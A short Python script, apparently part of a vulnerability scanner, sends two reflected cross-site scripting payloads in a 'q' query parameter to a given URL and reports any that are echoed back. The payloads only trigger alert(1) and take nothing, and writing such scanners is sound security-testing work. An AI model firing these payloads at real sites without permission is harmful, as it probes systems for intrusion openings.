import requests

def run(url):
    print("[XSS Test] Running...")
    payloads = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"]
    for payload in payloads:
        try:
            r = requests.get(url, params={"q": payload}, timeout=3)
            if payload in r.text:
                print(f"[XSS] Payload reflected: {payload}")
        except:
            continue